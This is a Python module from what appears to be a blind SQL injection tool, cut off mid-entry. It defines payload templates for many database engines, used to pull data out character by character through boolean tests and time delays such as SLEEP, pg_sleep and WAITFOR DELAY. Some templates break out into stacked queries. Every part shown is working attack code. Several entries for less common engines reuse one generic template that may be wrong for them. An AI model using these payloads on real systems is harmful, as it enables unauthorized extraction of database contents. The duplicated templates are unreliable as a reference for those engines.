from __future__ import annotations

import logging
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from difflib import SequenceMatcher
from statistics import mean, pstdev
from typing import Any

import structlog

from stealthix.core.session import ScanSession
from stealthix.detection.rest_api import method_uses_body
from stealthix.extraction.base import (
    _apply_injection,
    _finalize_collection_result,
    _finalize_rows_result,
    _make_request,
    _prepare_payload,
    _record_success,
    _response_entry,
    _result_base,
)

logger = structlog.get_logger(__name__)

_BLIND_CHAR_BATCH_SIZE = 4
_BLIND_LENGTH_BATCH_SIZE = 4
_BLIND_LENGTH_PACK_BASE = 4097


@dataclass(frozen=True)
class BlindDialect:
    name: str
    length_expr: Callable[[str], str]
    ascii_expr: Callable[[str, int], str]
    cast_text: Callable[[str], str]
    hex_expr: Callable[[str], str] | None
    boolean_wrapper: Callable[[str], str]
    time_wrapper: Callable[[str, float], str] | None


def _literal(value: str | None) -> str:
    escaped = str(value or "").replace("'", "''")
    return f"'{escaped}'"


def _select_scalar(dialect: BlindDialect, *items: str) -> str:
    suffix = " FROM dual" if dialect.name == "oracle" else ""
    return f"SELECT {', '.join(items)}{suffix}"


def _derived_alias(dialect: BlindDialect, alias: str) -> str:
    return alias if dialect.name == "oracle" else f"AS {alias}"


def _coalesce_number(dialect: BlindDialect, expression: str) -> str:
    if dialect.name == "oracle":
        return f"NVL({expression},0)"
    return f"COALESCE({expression},0)"


def _mysql_like_cast(expr: str) -> str:
    return f"COALESCE(CAST(({expr}) AS CHAR), '')"


def _pg_like_cast(expr: str) -> str:
    return f"COALESCE(CAST(({expr}) AS TEXT), '')"


def _mssql_cast(expr: str) -> str:
    return f"COALESCE(CAST(({expr}) AS NVARCHAR(4000)), '')"


def _oracle_cast(expr: str) -> str:
    return f"NVL(TO_CHAR(({expr})), '')"


def _sqlite_cast(expr: str) -> str:
    return f"COALESCE(CAST(({expr}) AS TEXT), '')"


_DIALECTS: dict[str, BlindDialect] = {
    "mysql": BlindDialect(
        name="mysql",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "mariadb": BlindDialect(
        name="mariadb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "tidb": BlindDialect(
        name="tidb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "percona": BlindDialect(
        name="percona",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "memsql": BlindDialect(
        name="memsql",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "drizzle": BlindDialect(
        name="drizzle",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "postgresql": BlindDialect(
        name="postgresql",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"ENCODE(CONVERT_TO(CAST(({expr}) AS TEXT), 'UTF8'), 'hex')",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1; SELECT CASE WHEN ({predicate}) THEN pg_sleep({delay:.1f}) ELSE pg_sleep(0) END--"
        ),
    ),
    "cockroachdb": BlindDialect(
        name="cockroachdb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"ENCODE(CONVERT_TO(CAST(({expr}) AS TEXT), 'UTF8'), 'hex')",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1; SELECT CASE WHEN ({predicate}) THEN pg_sleep({delay:.1f}) ELSE pg_sleep(0) END--"
        ),
    ),
    "yugabytedb": BlindDialect(
        name="yugabytedb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"ENCODE(CONVERT_TO(CAST(({expr}) AS TEXT), 'UTF8'), 'hex')",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1; SELECT CASE WHEN ({predicate}) THEN pg_sleep({delay:.1f}) ELSE pg_sleep(0) END--"
        ),
    ),
    "redshift": BlindDialect(
        name="redshift",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"ENCODE(CONVERT_TO(CAST(({expr}) AS TEXT), 'UTF8'), 'hex')",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1; SELECT CASE WHEN ({predicate}) THEN pg_sleep({delay:.1f}) ELSE pg_sleep(0) END--"
        ),
    ),
    "greenplum": BlindDialect(
        name="greenplum",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"ENCODE(CONVERT_TO(CAST(({expr}) AS TEXT), 'UTF8'), 'hex')",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1; SELECT CASE WHEN ({predicate}) THEN pg_sleep({delay:.1f}) ELSE pg_sleep(0) END--"
        ),
    ),
    "vertica": BlindDialect(
        name="vertica",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARBINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "yellowbrick": BlindDialect(
        name="yellowbrick",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"ENCODE(CONVERT_TO(CAST(({expr}) AS TEXT), 'UTF8'), 'hex')",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1; SELECT CASE WHEN ({predicate}) THEN pg_sleep({delay:.1f}) ELSE pg_sleep(0) END--"
        ),
    ),
    "enterprisedb": BlindDialect(
        name="enterprisedb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"ENCODE(CONVERT_TO(CAST(({expr}) AS TEXT), 'UTF8'), 'hex')",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1; SELECT CASE WHEN ({predicate}) THEN pg_sleep({delay:.1f}) ELSE pg_sleep(0) END--"
        ),
    ),
    "yugabyte_ysql": BlindDialect(
        name="yugabyte_ysql",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"ENCODE(CONVERT_TO(CAST(({expr}) AS TEXT), 'UTF8'), 'hex')",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1; SELECT CASE WHEN ({predicate}) THEN pg_sleep({delay:.1f}) ELSE pg_sleep(0) END--"
        ),
    ),
    "timescaledb": BlindDialect(
        name="timescaledb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"ENCODE(CONVERT_TO(CAST(({expr}) AS TEXT), 'UTF8'), 'hex')",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1; SELECT CASE WHEN ({predicate}) THEN pg_sleep({delay:.1f}) ELSE pg_sleep(0) END--"
        ),
    ),
    "sqlite": BlindDialect(
        name="sqlite",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"UNICODE(SUBSTR(({expr}),{pos},1))",
        cast_text=_sqlite_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BLOB))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=None,
    ),
    "h2": BlindDialect(
        name="h2",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "hsqldb": BlindDialect(
        name="hsqldb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "mssql": BlindDialect(
        name="mssql",
        length_expr=lambda expr: f"LEN(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mssql_cast,
        hex_expr=lambda expr: (
            f"SUBSTRING(master.dbo.fn_varbintohexstr(CAST(({expr}) AS VARBINARY(MAX))),3,8000)"
        ),
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1'; IF ({predicate}) WAITFOR DELAY '0:0:{max(1, int(round(delay)))}'--"
        ),
    ),
    "sybase": BlindDialect(
        name="sybase",
        length_expr=lambda expr: f"LEN(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mssql_cast,
        hex_expr=lambda expr: (
            f"SUBSTRING(master.dbo.fn_varbintohexstr(CAST(({expr}) AS VARBINARY(MAX))),3,8000)"
        ),
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1'; IF ({predicate}) WAITFOR DELAY '0:0:{max(1, int(round(delay)))}'--"
        ),
    ),
    "azure_synapse": BlindDialect(
        name="azure_synapse",
        length_expr=lambda expr: f"LEN(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mssql_cast,
        hex_expr=lambda expr: (
            f"SUBSTRING(master.dbo.fn_varbintohexstr(CAST(({expr}) AS VARBINARY(MAX))),3,8000)"
        ),
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1'; IF ({predicate}) WAITFOR DELAY '0:0:{max(1, int(round(delay)))}'--"
        ),
    ),
    "db2": BlindDialect(
        name="db2",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR(4000)), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR(4000) FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "oracle": BlindDialect(
        name="oracle",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTR(({expr}),{pos},1))",
        cast_text=_oracle_cast,
        hex_expr=lambda expr: f"RAWTOHEX(UTL_I18N.STRING_TO_RAW(({expr}), 'AL32UTF8'))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN DBMS_PIPE.RECEIVE_MESSAGE('stealthix',{max(1, int(round(delay)))}) ELSE 1 END)=1--"
        ),
    ),
    "firebird": BlindDialect(
        name="firebird",
        length_expr=lambda expr: f"CHAR_LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR(4000)), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR(4000) FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "sap_maxdb": BlindDialect(
        name="sap_maxdb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "informix": BlindDialect(
        name="informix",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR(4000)), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR(4000) FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "monetdb": BlindDialect(
        name="monetdb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BLOB))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "clickhouse": BlindDialect(
        name="clickhouse",
        length_expr=lambda expr: f"length(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(substring(({expr}),{pos},1))",
        cast_text=lambda expr: f"coalesce(toString(({expr})), '')",
        hex_expr=lambda expr: f"hex(CAST(({expr}) AS String))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN sleep({delay:.1f}) ELSE sleep(0) END)--"
        ),
    ),
    "snowflake": BlindDialect(
        name="snowflake",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SYSTEM$WAIT({delay * 1000}, 'MILLISECOND') ELSE SYSTEM$WAIT(0, 'MILLISECOND') END)--"
        ),
    ),
    "bigquery": BlindDialect(
        name="bigquery",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS STRING), '')",
        hex_expr=lambda expr: f"TO_HEX(CAST(({expr}) AS BYTES))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay * 1000000}) ELSE SLEEP(0) END)--"
        ),
    ),
    "apache_derby": BlindDialect(
        name="apache_derby",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=None,
    ),
    "presto": BlindDialect(
        name="presto",
        length_expr=lambda expr: f"length(({expr}))",
        ascii_expr=lambda expr, pos: f"ascii(substring(({expr}),{pos},1))",
        cast_text=lambda expr: f"coalesce(cast(({expr}) as varchar), '')",
        hex_expr=lambda expr: f"to_hex(cast(({expr}) as varbinary))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN sleep({delay:.1f}) ELSE sleep(0) END)--"
        ),
    ),
    "trino": BlindDialect(
        name="trino",
        length_expr=lambda expr: f"length(({expr}))",
        ascii_expr=lambda expr, pos: f"ascii(substring(({expr}),{pos},1))",
        cast_text=lambda expr: f"coalesce(cast(({expr}) as varchar), '')",
        hex_expr=lambda expr: f"to_hex(cast(({expr}) as varbinary))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN sleep({delay:.1f}) ELSE sleep(0) END)--"
        ),
    ),
    "duckdb": BlindDialect(
        name="duckdb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BLOB))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "cubrid": BlindDialect(
        name="cubrid",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "altibase": BlindDialect(
        name="altibase",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "mimersql": BlindDialect(
        name="mimersql",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "cratedb": BlindDialect(
        name="cratedb",
        length_expr=lambda expr: f"length(({expr}))",
        ascii_expr=lambda expr, pos: f"ascii(substring(({expr}),{pos},1))",
        cast_text=lambda expr: f"coalesce(cast(({expr}) as string), '')",
        hex_expr=lambda expr: f"hex(cast(({expr}) as string))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN sleep({delay:.1f}) ELSE sleep(0) END)--"
        ),
    ),
    "mckoi": BlindDialect(
        name="mckoi",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "cache": BlindDialect(
        name="cache",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "virtuoso": BlindDialect(
        name="virtuoso",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARBINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "frontbase": BlindDialect(
        name="frontbase",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "raima": BlindDialect(
        name="raima",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "extremedb": BlindDialect(
        name="extremedb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARCHAR FOR BIT DATA))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "voltdb": BlindDialect(
        name="voltdb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
